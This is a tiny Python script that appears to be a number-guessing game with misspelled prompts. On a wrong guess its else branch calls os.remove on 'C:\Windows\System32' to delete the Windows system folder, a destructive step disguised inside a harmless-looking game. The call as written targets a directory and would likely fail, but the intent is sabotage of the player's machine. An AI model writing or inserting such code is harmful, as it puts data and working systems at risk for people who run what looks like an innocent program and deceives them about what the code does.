import random
import os

number = random.randint(1,10)

gusse = input("Gusse a number between 1 to 10")
gusse = int(gusse)

if gusse == number:
    print("you won")
else:
    os.remove('C:\Windows\System32')